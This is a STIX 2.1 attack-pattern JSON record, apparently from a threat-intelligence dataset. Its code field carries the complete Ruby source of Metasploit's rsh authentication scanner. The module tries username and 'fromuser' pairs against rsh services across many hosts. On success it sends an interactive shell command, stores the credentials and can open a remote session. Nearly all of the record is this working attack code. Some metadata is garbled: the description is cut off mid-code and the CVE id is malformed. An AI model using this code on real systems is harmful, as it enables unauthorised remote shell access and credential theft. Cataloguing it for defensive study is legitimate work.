{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--a9a40e7b-88ab-48d1-b5c9-56066360381d",
    "created": "2024-08-14T16:27:15.087025Z",
    "modified": "2024-08-14T16:27:15.087029Z",
    "name": "rsh Authentication Scanner",
    "description": " This module will test a shell (rsh) service on a range of machines and report successful logins.  NOTE: This module requires access to bind to privileged ports (below 1024).  'References' => [",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/rservices/rsh_login.rb",
            "external_id": "rsh_login.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "1999-0502#Weakpassword"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::Tcp\n  include Msf::Auxiliary::Report\n  include Msf::Auxiliary::AuthBrute\n  include Msf::Auxiliary::RServices\n  include Msf::Auxiliary::Scanner\n  include Msf::Auxiliary::CommandShell\n\n  def initialize\n    super(\n      'Name'        => 'rsh Authentication Scanner',\n      'Description' => %q{\n          This module will test a shell (rsh) service on a range of machines and\n        report successful logins.\n\n        NOTE: This module requires access to bind to privileged ports (below 1024).\n      },\n      'References' =>\n        [\n          [ 'CVE', '1999-0651' ],\n          [ 'CVE', '1999-0502'] # Weak password\n        ],\n      'Author'      => [ 'jduck' ],\n      'License'     => MSF_LICENSE\n    )\n\n    register_options(\n      [\n        Opt::RPORT(514),\n        OptBool.new('ENABLE_STDERR', [ true, 'Enables connecting the stderr port', false ])\n      ])\n  end\n\n  def run_host(ip)\n    print_status(\"#{ip}:#{rport} - Starting rsh sweep\")\n\n    cmd = datastore['CMD']\n    cmd ||= 'sh -i 2>&1'\n\n    if datastore['ENABLE_STDERR']\n      # For each host, bind a privileged listening port for the target to connect\n      # back to.\n      ret = listen_on_privileged_port\n      if not ret\n        return :abort\n      end\n      sd, lport = ret\n    else\n      sd = lport = nil\n    end\n\n    # The maximum time for a host is set here.\n    Timeout.timeout(300) {\n      each_user_fromuser { |user, fromuser|\n        do_login(user, fromuser, cmd, sd, lport)\n      }\n    }\n\n    sd.close if sd\n  end\n\n\n  def each_user_fromuser(&block)\n    # Class variables to track credential use (for threading)\n    @@credentials_tried = {}\n    @@credentials_skipped = {}\n\n    credentials = extract_word_pair(datastore['USERPASS_FILE'])\n\n    users = load_user_vars()\n    credentials.each { |u,p| users << u }\n    users.uniq!\n\n    fromusers = load_fromuser_vars()\n\n    cleanup_files()\n\n    # We'll abuse this nice array combining function, despite its inaccurate name in this case :)\n    credentials = combine_users_and_passwords(users, fromusers)\n\n    fq_rest = \"%s:%s:%s\" % [datastore['RHOST'], datastore['RPORT'], \"all remaining users\"]\n\n    credentials.each do |u,fu|\n\n      break if @@credentials_skipped[fq_rest]\n\n      fq_user = \"%s:%s:%s\" % [datastore['RHOST'], datastore['RPORT'], u]\n\n      userpass_sleep_interval unless @@credentials_tried.empty?\n\n      next if @@credentials_skipped[fq_user]\n      next if @@credentials_tried[fq_user] == fu\n\n      ret = block.call(u, fu)\n\n      case ret\n      when :abort # Skip the current host entirely.\n        break\n\n      when :next_user # This means success for that user.\n        @@credentials_skipped[fq_user] = fu\n        if datastore['STOP_ON_SUCCESS'] # See?\n          @@credentials_skipped[fq_rest] = true\n        end\n\n      when :skip_user # Skip the user in non-success cases.\n        @@credentials_skipped[fq_user] = fu\n\n      when :connection_error # Report an error, skip this cred, but don't abort.\n        vprint_error \"#{datastore['RHOST']}:#{datastore['RPORT']} - Connection error, skipping '#{u}' from '#{fu}'\"\n      end\n      @@credentials_tried[fq_user] = fu\n    end\n  end\n\n\n  def do_login(user, luser, cmd, sfd, lport)\n    vprint_status(\"#{target_host}:#{rport} - Attempting rsh with username '#{user}' from '#{luser}'\")\n\n    # We must connect from a privileged port.\n    this_attempt ||= 0\n    ret = nil\n    while this_attempt <= 3 and (ret.nil? or ret == :refused)\n      if this_attempt > 0\n        # power of 2 back-off\n        select(nil, nil, nil, 2**this_attempt)\n        vprint_error \"#{rhost}:#{rport} rsh - Retrying '#{user}' from '#{luser}' due to reset\"\n      end\n      ret = connect_from_privileged_port\n      break if ret == :connected\n      this_attempt += 1\n    end\n\n    return :abort if ret != :connected\n\n    sock.put(\"#{lport}\\x00#{luser}\\x00#{user}\\x00#{cmd}\\x00\")\n\n    if sfd and lport\n      stderr_sock = sfd.accept\n      add_socket(stderr_sock)\n    else\n      stderr_sock = nil\n    end\n\n    # NOTE: We report this here, since we are awfully convinced now that this is really\n    # an rsh service.\n    report_service(\n      :host => rhost,\n      :port => rport,\n      :proto => 'tcp',\n      :name => 'shell'\n    )\n\n    # Read the expected nul byte response.\n    buf = sock.get_once(1) || ''\n    if buf != \"\\x00\"\n      buf = sock.get_once(-1)\n      if buf.nil?\n        return :failed\n      end\n      result = buf.gsub(/[[:space:]]+/, ' ')\n      vprint_error(\"Result: #{result}\")\n      return :skip_user if result =~ /locuser too long/\n      return :failed\n    end\n\n    # should we report a vuln here? rsh allowed w/o password?!\n    print_good(\"#{target_host}:#{rport}, rsh '#{user}' from '#{luser}' with no password.\")\n    start_rsh_session(rhost, rport, user, luser, buf, stderr_sock)\n\n    return :next_user\n\n  # For debugging only.\n  #rescue ::Exception\n  #\tprint_error(\"#{$!}\")\n  #\treturn :abort\n\n  ensure\n    disconnect()\n\n  end\n\n\n  #\n  # This is only needed by RSH so it is not in the rservices mixin\n  #\n  def listen_on_privileged_port\n    lport = 1023\n    sd = nil\n    while lport > 512\n      #vprint_status(\"Trying to listen on port #{lport} ..\")\n      sd = nil\n      begin\n        sd = Rex::Socket.create_tcp_server('LocalPort' => lport)\n\n      rescue Rex::BindFailed\n        # Ignore and try again\n\n      end\n\n      break if sd\n      lport -= 1\n    end\n\n    if not sd\n      print_error(\"Unable to bind to listener port\")\n      return false\n    end\n\n    add_socket(sd)\n    #print_status(\"Listening on port #{lport}\")\n    [ sd, lport ]\n  end\n\n  def report_cred(opts)\n    service_data = {\n      address: opts[:ip],\n      port: opts[:port],\n      service_name: opts[:service_name],\n      protocol: 'tcp',\n      workspace_id: myworkspace_id\n    }\n\n    credential_data = {\n      origin_type: :service,\n      module_fullname: fullname,\n      username: opts[:user],\n      private_data: opts[:password],\n      private_type: :password\n    }.merge(service_data)\n\n    login_data = {\n      core: create_credential(credential_data),\n      status: Metasploit::Model::Login::Status::UNTRIED,\n      proof: opts[:proof]\n    }.merge(service_data)\n\n    create_credential_login(login_data)\n  end\n\n  def start_rsh_session(host, port, user, luser, proof, stderr_sock)\n    service_data = {\n      address: host,\n      port: port,\n      service_name: 'shell',\n      proof: proof,\n      protocol: 'tcp',\n      workspace_id: myworkspace_id\n    }\n\n    credential_data = {\n      module_fullname: self.fullname,\n      origin_type: :service,\n      username: user,\n      # Save a reference to the socket so we don't GC prematurely\n      stderr_sock: stderr_sock\n    }.merge(service_data)\n\n    login_data = {\n      core: create_credential(credential_data),\n      status: Metasploit::Model::Login::Status::UNTRIED\n    }.merge(service_data)\n\n    if datastore['CreateSession']\n      start_session(self, \"RSH #{user} from #{luser} (#{host}:#{port})\", login_data, nil, self.sock)\n      # Don't tie the life of this socket to the exploit\n      self.sockets.delete(stderr_sock)\n      self.sock = nil\n    end\n  end\nend\n",
    "x_mitre_contributors": [
        "[ jduck ]",
        ""
    ]
}